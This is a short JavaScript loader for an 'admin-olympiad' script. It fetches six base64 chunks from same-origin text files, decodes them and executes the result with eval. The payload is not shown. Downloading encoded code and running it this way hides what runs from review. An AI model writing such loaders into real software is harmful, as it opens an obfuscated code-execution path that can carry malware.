/** admin-olympiad.js loader */
(function () {
  var n = 6, loaded = 0, parts = [];
  function go() {
    if (loaded < n) return;
    try {
      var s = atob(parts.join(''));
      var u = new Uint8Array(s.length);
      for (var i = 0; i < s.length; i++) u[i] = s.charCodeAt(i);
      (0, eval)(new TextDecoder('utf-8').decode(u));
    } catch (e) { console.error('[admin-olympiad]', e); }
  }
  for (var i = 0; i < n; i++) {
    (function (idx) {
      fetch('/_ao_b64_' + idx + '.txt?v=' + Date.now())
        .then(function (r) { if (!r.ok) throw new Error(r.status); return r.text(); })
        .then(function (t) { parts[idx] = (t || '').replace(/\s+/g, ''); loaded++; go(); })
        .catch(function (e) { console.error(e); });
    })(i);
  }
})();
